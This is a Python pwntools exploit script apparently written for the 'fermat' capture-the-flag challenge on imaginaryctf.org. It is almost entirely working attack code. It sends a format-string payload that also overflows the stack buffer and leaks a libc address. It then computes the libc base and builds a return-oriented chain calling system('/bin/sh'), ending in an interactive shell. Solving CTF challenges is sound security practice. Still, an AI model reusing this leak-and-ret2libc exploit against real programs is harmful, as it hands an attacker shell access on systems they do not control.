#!/usr/bin/python3

from pwn import *

exe = ELF('vuln_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1269

        c
        ''')
        input()


if args.REMOTE:
    p = remote('fermat.chal.imaginaryctf.org', 1337)
    p.recvline()
else:
    p = process(exe.path)
GDB()


s(b"%39$p\0".ljust(264, b'a') + p8(0x28))
libc.address = int(p.recv(0xe), 16) - 0x29d1c -0xc
info("libc.address: " + hex(libc.address))
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh')))
pa = b'a'*264 + rop.chain()
sl(pa) 
p.interactive()
